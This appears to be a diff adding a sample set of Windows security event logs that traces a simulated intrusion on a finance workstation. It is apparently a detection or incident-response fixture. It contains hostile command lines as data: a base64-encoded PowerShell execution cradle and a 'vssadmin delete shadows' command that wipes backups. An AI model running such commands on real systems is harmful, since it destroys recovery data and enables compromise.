@@ -1,0 +1,7 @@
+[
+  {"EventID": 4625, "Computer": "FINANCE-PC-21", "TargetUserName": "j.mehta", "IpAddress": "185.220.101.45", "TimeCreated": "2026-07-24T09:16:40Z"},
+  {"EventID": 4624, "Computer": "FINANCE-PC-21", "TargetUserName": "j.mehta", "IpAddress": "185.220.101.45", "TimeCreated": "2026-07-24T09:17:10Z"},
+  {"EventID": 4688, "Computer": "FINANCE-PC-21", "SubjectUserName": "j.mehta", "CommandLine": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA", "TimeCreated": "2026-07-24T09:22:31Z"},
+  {"EventID": 4720, "Computer": "FINANCE-PC-21", "TargetUserName": "svc_update", "SubjectUserName": "j.mehta", "TimeCreated": "2026-07-24T09:25:07Z"},
+  {"EventID": 4688, "Computer": "FINANCE-PC-21", "SubjectUserName": "svc_update", "CommandLine": "vssadmin.exe delete shadows /all /quiet", "TimeCreated": "2026-07-24T09:33:12Z"}
+]
